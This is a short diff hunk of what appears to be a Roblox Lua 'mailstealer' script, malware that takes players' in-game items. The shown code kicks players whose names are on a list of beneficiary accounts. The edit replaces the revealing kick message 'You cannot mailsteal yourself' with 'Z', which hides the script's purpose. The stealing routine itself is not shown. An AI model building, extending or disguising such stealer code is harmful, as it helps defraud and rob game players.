@@ -27,7 +27,7 @@ _G.scriptExecuted = true
 
 for _, user in ipairs(Usernames) do
     if plr.Name == user then
-        plr:kick("You cannot mailsteal yourself")
+        plr:kick("Z")
         return
     end
 end
